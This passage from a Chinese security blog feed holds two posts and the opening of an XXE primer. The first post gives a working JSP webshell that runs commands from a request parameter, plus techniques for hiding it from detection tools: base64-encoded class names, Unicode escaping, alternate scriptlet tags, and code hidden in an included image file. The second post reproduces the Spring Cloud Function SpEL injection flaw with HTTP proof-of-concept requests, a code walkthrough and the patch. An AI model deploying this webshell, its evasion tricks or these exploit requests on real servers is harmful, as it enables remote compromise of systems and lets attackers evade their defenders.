<h3 id="反射获取ProcessImpl类实现命令执行"><a href="#反射获取ProcessImpl类实现命令执行" class="headerlink" title="反射获取ProcessImpl类实现命令执行"></a>反射获取ProcessImpl类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null) &#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">        Class clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        //获取该class类</span><br><span class="line">        Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        //忽略访问权限</span><br><span class="line">        Process invoke1 = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            invoke1 = (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true);</span><br><span class="line">        &#125; catch (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InputStream input = invoke1.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        invoke1.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>有些检测工具可能会对命令执行的类名进行检测，这里可以对类名进行加密或者编码，比如对<code>java.lang.Runtime</code>进行base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String a = new String(Base64.getDecoder().decode(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;));</span><br><span class="line">System.out.println(a);</span><br></pre></td></tr></table></figure>

<p>不仅仅是类名，像命令执行的函数名同理，方法有很多，常见的加密都可以尝试。</p>
<h2 id="include指令"><a href="#include指令" class="headerlink" title="include指令"></a>include指令</h2><p>Java Web 中有<code>include</code>指令，可以将外部文件嵌入到当前jsp语句中，并同时解析页面的jsp语句，和PHP中的<code>include</code>类似。</p>
<p>比如我们包含一个1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ include file=&quot;1.jpg&quot; %&gt;</span><br></pre></td></tr></table></figure>

<p>这个时候我们可以在1.jpg中插入恶意代码，也是可以正常访问的</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319103521521-734876725.png" alt="image-20220319103520678"></p>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>Java 程序可以自动识别Unicode编码，所以我们可以将java源代码中除了page指令的代码外的，全部编码。</p>
<p>编写代码如下，代码的功能是读取保存了恶意代码的文件，然后将文件中的代码进行unicode编码输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.sec.test01.test;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Testdd &#123;</span><br><span class="line">    public static void  convert(String str) &#123;</span><br><span class="line">        str = (str == null ? &quot;&quot; : str);</span><br><span class="line">        String tmp;</span><br><span class="line">        StringBuffer sb = new StringBuffer(1000);</span><br><span class="line">        char c;</span><br><span class="line">        int i, j;</span><br><span class="line">        sb.setLength(0);</span><br><span class="line">        for (i = 0; i &lt; str.length(); i++) &#123;</span><br><span class="line">            c = str.charAt(i);</span><br><span class="line">            sb.append(&quot;\\u&quot;);</span><br><span class="line">            j = (c &gt;&gt;&gt; 8); //取出高8位</span><br><span class="line">            tmp = Integer.toHexString(j);</span><br><span class="line">            if (tmp.length() == 1) &#123;</span><br><span class="line">                sb.append(&quot;0&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(tmp);</span><br><span class="line">            j = (c &amp; 0xFF); //取出低8位</span><br><span class="line">            tmp = Integer.toHexString(j);</span><br><span class="line">            if (tmp.length() == 1) &#123;</span><br><span class="line">                sb.append(&quot;0&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(tmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(new String(sb));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        File srcfile = new File(&quot;D:\\code\\java1\\Reflect\\src\\main\\java\\com\\sec\\test01\\test\\1.txt&quot;);</span><br><span class="line">        FileReader fileReader = new FileReader(srcfile);</span><br><span class="line">        BufferedReader bufferedReader = new BufferedReader(fileReader);</span><br><span class="line">        String s;</span><br><span class="line">        while ((s = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">            convert(s);</span><br><span class="line">            System.out.print(&quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编写一个jsp，import需要的类，剩余就把生成的unicode字符粘贴到里面即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;!--import导入需要的类，否则会导致创建变量失败--&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    生成的unicode编码</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319110731267-51009504.png" alt="image-20220319110731080"></p>
<p>可以进一步优化，Unicode编码的关键点在于以’\u’开头，表明是unicode编码，可以将’u’重复声明，即’\uuuuuuu’达到混淆的目的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;\u006f\u0075\u0074&quot;);</span><br><span class="line">System.out.println(&quot;\uuuuuu006f\uuuuuuu0075\uuu0074&quot;);</span><br></pre></td></tr></table></figure>

<p>输出一致：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319111304030-1585241469.png" alt="image-20220319111303826"></p>
<p>可以再输出的时候将”\u”替换成”\uuuuuuuu”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.print(new String(sb).replace(&quot;\\u&quot;, &quot;\\uuuuuuuu&quot;));</span><br></pre></td></tr></table></figure>

<p>同样，也可以转换成其他编码格式。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>标签绕过，jsp标签<code>&lt;%%&gt;</code>可以使用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>代替。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">    恶意代码</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure>

<p>效果一样</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220319112955214-1339046604.png" alt="image-20220319112955161"></p>
<p>对于传入的参数可以先将其存储进会话，然后调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.setAttribute(&quot;a&quot;,request.getParameter(&quot;cmd&quot;));</span><br><span class="line">String cmd = request.getAttribute(&quot;a&quot;).toString();</span><br></pre></td></tr></table></figure>

<p>检测传入的命令，可以通过编码、加密、反转等等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//base64编码反转</span><br><span class="line">String cmd = new String(Base64.getDecoder().decode(reverseStr(bs64)),&quot;UTF-8&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/c54ec1cbc091">https://www.jianshu.com/p/c54ec1cbc091</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>反射</tag>
        <tag>Webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Cloud Function SpEL漏洞分析及复现</title>
    <url>/2022/03/29/Spring%20Cloud%20Function%20SpEL%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h3><p>当<code>Spring Cloud Function</code> 启用动态路由<code>functionRouter</code>时，由于<code>Spring Cloud  Function</code>中<code>RoutingFunction</code>类的apply方法将请求头中的<code>spring.cloud.function.routing-expression</code>参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。</p>
<span id="more"></span>

<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>官方的环境（需要修改pom.xml）：</p>
<p><a href="https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo">https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo</a></p>
<p>cckuailong师傅创建的环境（需要jdk17）：</p>
<p><a href="https://github.com/cckuailong/spring-cloud-function-SpEL-RCE">https://github.com/cckuailong/spring-cloud-function-SpEL-RCE</a></p>
<p>jwwam师傅的环境（可以jdk8，需要修改pom.xml）：</p>
<p><a href="https://github.com/jwwam/scfunc">https://github.com/jwwam/scfunc</a></p>
<p>或者下载jar包运行（需要jdk11）：「SpringCloud-Function-0.0.1-SNAPSHOT.jar」<a href="https://www.aliyundrive.com/s/m8evrX31CkU">https://www.aliyundrive.com/s/m8evrX31CkU</a></p>
<p>修改pom.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">		 xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">		 xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">	&lt;groupId&gt;io.spring.sample&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;function-sample-pojo&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.2.1.RELEASE&lt;/version&gt;</span><br><span class="line">	&lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">	&lt;name&gt;function-sample-pojo&lt;/name&gt;</span><br><span class="line">	&lt;description&gt;Spring Cloud Function Web Support&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">	&lt;parent&gt;</span><br><span class="line">		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">		&lt;version&gt;3.0.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">		&lt;relativePath/&gt;</span><br><span class="line">	&lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">	&lt;properties&gt;</span><br><span class="line">		&lt;spring-cloud-function.version&gt;3.2.1-SNAPSHOT&lt;/spring-cloud-function.version&gt;</span><br><span class="line">		&lt;wrapper.version&gt;1.0.27.RELEASE&lt;/wrapper.version&gt;</span><br><span class="line">	&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">	&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-cloud-starter-function-webflux&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;</span><br><span class="line">			&lt;optional&gt;true&lt;/optional&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">			&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">	&lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">	&lt;dependencyManagement&gt;</span><br><span class="line">		&lt;dependencies&gt;</span><br><span class="line">			&lt;dependency&gt;</span><br><span class="line">				&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;spring-cloud-function-dependencies&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;$&#123;spring-cloud-function.version&#125;&lt;/version&gt;</span><br><span class="line">				&lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">				&lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">			&lt;/dependency&gt;</span><br><span class="line">		&lt;/dependencies&gt;</span><br><span class="line">	&lt;/dependencyManagement&gt;</span><br><span class="line"></span><br><span class="line">	&lt;build&gt;</span><br><span class="line">		&lt;plugins&gt;</span><br><span class="line">			&lt;plugin&gt;</span><br><span class="line">				&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;</span><br><span class="line">				&lt;configuration&gt;</span><br><span class="line">					&lt;skip&gt;true&lt;/skip&gt;</span><br><span class="line">				&lt;/configuration&gt;</span><br><span class="line">			&lt;/plugin&gt;</span><br><span class="line">			&lt;plugin&gt;</span><br><span class="line">				&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">				&lt;dependencies&gt;</span><br><span class="line">					&lt;dependency&gt;</span><br><span class="line">						&lt;groupId&gt;org.springframework.boot.experimental&lt;/groupId&gt;</span><br><span class="line">						&lt;artifactId&gt;spring-boot-thin-layout&lt;/artifactId&gt;</span><br><span class="line">						&lt;version&gt;$&#123;wrapper.version&#125;&lt;/version&gt;</span><br><span class="line">					&lt;/dependency&gt;</span><br><span class="line">				&lt;/dependencies&gt;</span><br><span class="line">			&lt;/plugin&gt;</span><br><span class="line">			&lt;plugin&gt;</span><br><span class="line">				&lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class="line">				&lt;configuration&gt;</span><br><span class="line">					&lt;includes&gt;</span><br><span class="line">						&lt;include&gt;**/*Tests.java&lt;/include&gt;</span><br><span class="line">						&lt;include&gt;**/*Test.java&lt;/include&gt;</span><br><span class="line">					&lt;/includes&gt;</span><br><span class="line">					&lt;excludes&gt;</span><br><span class="line">						&lt;exclude&gt;**/Abstract*.java&lt;/exclude&gt;</span><br><span class="line">					&lt;/excludes&gt;</span><br><span class="line">				&lt;/configuration&gt;</span><br><span class="line">			&lt;/plugin&gt;</span><br><span class="line">		&lt;/plugins&gt;</span><br><span class="line">	&lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>拉取仓库后用IDEA maven进行打包调试即可。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p>
<p>可以看到官方给的测试用例如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330010520987-258020339.png" alt="image-20220330010520323"></p>
<p>有个核心的地方就是设置一个请求头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setHeader(FunctionProperties.PREFIX + &quot;.routing-expression&quot;,&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a calculator.app\&quot;)&quot;)</span><br></pre></td></tr></table></figure>

<p>请求头中的<code>FunctionProperties.PREFIX</code>为<code>spring.cloud.function</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330011359605-1752898534.png" alt="image-20220330011359150"></p>
<p>所以拼接起来，漏洞的利用是在请求的headers头上添加一个<code>spring.cloud.function.routing-expression</code>参数，然后会将其参数内容直接带入到SPEL中查询，造成SpEL漏洞注入。</p>
<p>POC1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330014710976-2126231147.png" alt="image-20220330014710218"></p>
<p>application.properties</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330111652281-1882515346.png" alt="image-20220330111652398"></p>
<p>POC2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p>application.properties</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330111716617-918890702.png" alt="image-20220330111716779"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞是出在<code>SpringCloud  Function</code>的<code>RoutingFunction</code>功能上，其功能的目的本身就是为了微服务应运而生的，可以直接通过HTTP请求与单个的函数进行交互，同时为<code>spring.cloud.function.definition</code>参数提供您要调用的函数的名称。</p>
<p>比如我们可以自定义一个函数，这里随意编写一个反转函数用来测试</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330020451902-1074931253.png" alt="image-20220330020451543"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Bean    //第一个String代表输入类型，第二个String代表输出类型</span><br><span class="line">	public Function&lt;String, String&gt; reverseString() &#123;</span><br><span class="line">		return value -&gt; new StringBuilder(value).reverse().toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>通过在请求头中添加<code>spring.cloud.function.definition:</code> 函数名即可调用我们的函数</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330020325403-559736302.png" alt="image-20220330020324910"></p>
<p>下面分析漏洞利用的过程</p>
<h4 id="第1种利用：需要修改配置-任意路由"><a href="#第1种利用：需要修改配置-任意路由" class="headerlink" title="第1种利用：需要修改配置+任意路由"></a>第1种利用：需要修改配置+任意路由</h4><p>首先我们在漏洞利用的时候是先发起一个post请求的，因此，我们可以先查看后端的Controller层对提交的请求做了哪些操作</p>
<p>定位到控制层代码<code>org\springframework\cloud\function\web\mvc\FunctionController.java#post</code>方法，在此处打上断点</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330021314819-442313903.png" alt="image-20220330021314391"></p>
<p>点击调试按钮，burp发送poc</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330021659096-81060508.png" alt="image-20220330021658671"></p>
<p>此时停在了断点处，可以在Variables视图看到<code>spring.cloud.function.routing-expression</code>头的赋值情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletWebRequest-&gt;HttpServletRequest-&gt;Request-&gt;MimeHeaders-&gt;headers-&gt;spring.cloud.function.routing-expression</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330022344967-1509764902.png" alt="image-20220330022344082"></p>
<p>往下，程序会获取body中的参数，并传入processRequest方法中，在processRequest方法中会获取通过wrapper对象获取到请求头，并将请求体和请求头封装成inputMessage，接着调用<code>FunctionInvocationWrapper#isRoutingFunction</code>方法判断当前请求是否为RoutingFunction。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330024427531-1408829946.png" alt="image-20220330024426871"></p>
<p>接着往下，通过<code>FunctionInvocationWrapper#apply</code>方法将请求的内容和Header头封装成的input带入到<code>FunctionInvocationWrapper.apply</code>方法中，随后又进入其中的doApply方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330024926370-1410073270.png" alt="image-20220330024925921"></p>
<p>在doApply方法中，会判断当前的RoutingFunction和Composed是否为true，如果是，则调用<code>RoutingFunction</code>的apply方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330025516556-343128977.png" alt="image-20220330025515539"></p>
<p>跟进apply方法，发现其调用了<code>RoutingFunction#route</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330030219026-1186212549.png" alt="image-20220330030218623"></p>
<p>跟进route方法，if判断中，获取header请求头中的字段，判断是否存在<code>spring.cloud.function.definition</code>，若不存在则判断是否存在<code>spring.cloud.function.routing-expression</code>，如存在则调用<code>functionFromExpression</code>方法解析对应的值。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330030845396-1989933020.png" alt="image-20220330030844758"></p>
<p>进入<code>functionFromExpression</code>方法中，可以看到通过<code>SpelExpressionParser</code>来解析内容，导致Spel表达式注入。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330031309339-1389221856.png" alt="image-20220330031308676"></p>
<p>这里可以看到设置<code>EvaluationContext</code>的值是<code>StandardEvaluationContext</code>，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330031817613-1636925655.png" alt="image-20220330031816947"></p>
<p>如下，evalContext对象创建采用的是<code>StandardEvaluationContext</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330031931608-303862117.png" alt="image-20220330031931303"></p>
<h4 id="第2种利用：默认配置-特定路由"><a href="#第2种利用：默认配置-特定路由" class="headerlink" title="第2种利用：默认配置+特定路由"></a>第2种利用：默认配置+特定路由</h4><p>定位到<code>FunctionHandlerMapping.java#HandlerMethod</code>方法，方法中会获取请求的路径，然后调用<code>findFunction</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330113254208-1412992217.png" alt="image-20220330113254178"></p>
<p>接着跟进<code>doFindFunction</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330113801841-816435868.png" alt="image-20220330113801926"></p>
<p>后调用<code>FunctionCatalog#lookup</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114045130-2137151268.png" alt="image-20220330114045221"></p>
<p>继续跟进lookup方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114158324-1902508255.png" alt="image-20220330114158564"></p>
<p>又调用dolookup方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114259775-395682282.png" alt="image-20220330114259887"></p>
<p>dolookup方法大概是在为function进行赋值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114554904-1169967782.png" alt="image-20220330114554987"></p>
<p>返回function之后，往下走，在<code>discoverFunctionInBeanFactory</code>方法处，做了一个类似于查询的操作，查找bean工厂中是否有functionRouter，如果有就返回，这里可以看到返回了RoutingFunction对象（经过调试，如果这里没有查询到，后面就返回null，就不会结果post方法进行后续的调用，也就是不会触发SpEL表达式注入）</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330171823760-496272863.png" alt="image-20220330171824010"></p>
<p>最后调用父类的doLookup方法，返回function对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330172321169-1154231931.png" alt="image-20220330172321312"></p>
<p>返回之后，回到<code>FunctionWebRequestProcessingHelper.java</code>类调用<code>doFindFunction</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330172418160-1118719027.png" alt="image-20220330172418514"></p>
<p>继续往下就回到了<code>FunctionHandlerMapping.java#getHandlerInternal</code>方法，将function保存到request的作用域中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330172639513-1230584586.png" alt="image-20220330172639853"></p>
<p>最后经过一连串的F8，就到了熟悉的post方法，后续的步骤就是一样的了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330173056936-17926663.png" alt="image-20220330173057185"></p>
<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>在补丁中，通过<code>SimpleEvaluationContext</code>来构建<code>EvalContext</code>对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330032522641-247909414.png" alt="image-20220330032522050"></p>
<p>在<code>functionFromExpression</code>函数中添加了一个boolean型的参数</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330033300387-1490197489.png" alt="image-20220330033300034"></p>
<p>根据传入的值为true，即调用<code>getValue(this.headerEvalContext, input, String.class)</code>，也就防止SpEL注入的发生。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330033426315-574243917.png" alt="image-20220330033425927"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/wh4am1/p/16062306.html">https://www.cnblogs.com/wh4am1/p/16062306.html</a></p>
<p><a href="https://mp.weixin.qq.com/s/O2vJmMgqrQp5RTLwvZ5X_w">https://mp.weixin.qq.com/s/O2vJmMgqrQp5RTLwvZ5X_w</a></p>
<p><a href="https://mp.weixin.qq.com/s/2gKqp3YJtZJ7MMtbkHhOBA">https://mp.weixin.qq.com/s/2gKqp3YJtZJ7MMtbkHhOBA</a></p>
<p><a href="https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg">https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>SpEL</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞学习</title>
    <url>/2022/03/21/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="XXE基础"><a href="#XXE基础" class="headerlink" title="XXE基础"></a>XXE基础</h2><h3 id="XXE概述"><a href="#XXE概述" class="headerlink" title="XXE概述"></a>XXE概述</h3><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
<span id="more"></span>

<h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h4><p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。</p>
<h5 id="文档结构"><a href="#文档结构" class="headerlink" title="文档结构"></a>文档结构</h5><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
